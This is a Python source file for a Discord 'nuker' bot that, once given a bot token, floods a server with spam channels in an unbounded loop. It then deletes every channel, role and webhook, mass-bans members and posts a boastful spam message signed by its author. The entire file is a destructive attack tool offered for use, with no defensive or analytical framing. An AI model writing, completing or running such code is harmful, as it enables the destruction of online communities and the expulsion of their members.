import discord
from discord.ext import commands
from config import BOT_NAME, GUILD_OVERWRITE_NAME
from features.deletion_module import DeletionModule
from features.moderation_module import ModerationModule
from utils import generate_channel_name

class NukerEngine:
    def __init__(self):
        self.bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
        self.deletion = DeletionModule(self.bot)
        self.moderation = ModerationModule(self.bot)

    async def initialize_bot(self, token: str):
        """Logs into Discord."""
        try:
            await self.bot.login(token)
            print("✅ Successfully logged into the bot.")
        except discord.LoginFailure:
            print("❌ ERROR: Invalid Bot Token provided.")
            exit()

    async def _create_bloated_channels(self, guild_id: int):
        """Performs the mass creation of spam channels."""
        print("\n--- STAGE 0/4 (Pre-Attack): Creating Bloat Channels ---")
        guild = self.bot.get_guild(guild_id)
        if not guild:
            print("Error: Could not find the specified Guild.")
            return

        channels_created = []
        while True:
            try:
                channel = await guild.create_text_channel(
                    name=generate_channel_name(), 
                    topic=f"Channel created by {self.bot.user.name} - Spam Payload",
                    reason="Quantum Nuker Bloat Creation"
                )
                print(f"✅ Created bloated channel: {channel.name}")
                channels_created.append(channel)
                await asyncio.sleep(0.1)

            except discord.Forbidden:
                print("❌ Permission denied while creating channels. Cannot proceed with full bloat.")
                break
            except Exception as e:
                print(f"💥 Failed during channel creation loop: {e}")
                break

        return channels_created

    async def execute_nuke_sequence(self, guild_id: int):
        """Runs the entire automated attack sequence."""
        await self.bot.change_presence(activity=discord.Game(name="Nuking in Progress"))

        print("\n=========================================")
        print("🚀 Quantum NUKER ATTACK SEQUENCE STARTING 🚀")
        print("=========================================\n")

        await self._create_bloated_channels(guild_id)
      
        deleted_channels, _ = await self.deletion.delete_all_channels(guild_id)
        print(f"\n[SUMMARY] Deleted {deleted_channels} channels.")

        deleted_roles = await self.deletion.delete_roles(guild_id)
        print(f"[SUMMARY] Deleted {deleted_roles} roles.")

        deleted_webhooks = await self.deletion.delete_webhooks(guild_id)
        print(f"[SUMMARY] Deleted {deleted_webhooks} webhooks.")

        banned_count = await self.moderation.mass_ban(guild_id)
        print(f"\n[SUMMARY] Successfully banned {banned_count} members.")

        final_message = f"The server has been annihilated by the ultimate force! Initiated by Rexden. Check out my empire here: https://github.com/r3xden/"
        await self.moderation.perform_spam(guild_id, final_message)

        print("\n=========================================")
        print("✅ NUKING SEQUENCE COMPLETE!")
        print("=========================================\n")

import asyncio 
